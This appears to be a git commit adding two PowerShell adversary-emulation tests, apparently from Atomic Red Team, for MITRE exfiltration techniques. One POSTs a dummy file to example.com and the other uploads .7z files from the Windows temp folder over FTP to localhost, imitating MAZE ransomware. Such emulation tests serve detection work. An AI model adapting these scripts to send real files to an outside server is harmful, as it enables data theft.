0c67f956478aa7b88ed90bb56bf0687f3ad5a102
keith.salandanan <keith.salandanan@oqulo.com>
2022-09-28 15:08:07 +0800

    added Exfiltration files

---
+++ Exfiltration/T1041.ps1
@@ -0,0 +1,8 @@
+#Atomic Test #1 - C2 Data Exfiltration
+
+if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 
+    1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_." }
+}
+[System.Net.ServicePointManager]::Expect100Continue = $false
+$filecontent = Get-Content -Path $env:TEMP\LineNumbers.txt
+Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive
---
+++ Exfiltration/T1048.003.ps1
@@ -0,0 +1,24 @@
+#Atomic Test #6 - MAZE FTP Upload
+
+$Dir_to_copy = "$env:windir\temp"
+$ftp = "ftp://127.0.0.1/"
+$web_client = New-Object System.Net.WebClient
+$web_client.Credentials = New-Object System.Net.NetworkCredential('', '')
+if (test-connection -count 1 -computername "127.0.0.1" -quiet){
+    foreach($file in (dir $Dir_to_copy "*.7z")){
+        echo "Uploading $file..."
+        $uri = New-Object System.Uri($ftp+$file.name)
+        $web_client.UploadFile($uri, $file.FullName)
+    }
+}else{
+    echo "FTP Server Unreachable. Please verify the server address in input args and try again."
+}
+
+#Cleanup Commands:
+# $ftp = "ftp://127.0.0.1/"
+# try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
+# {$uri = New-Object System.Uri($ftp+$file.name)
+#  $ftp_del = [System.Net.FtpWebRequest]::create($uri)
+#  $ftp_del.Credentials = New-Object System.Net.NetworkCredential('','')
+#  $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
+#  $ftp_del.GetResponse()}} catch{}
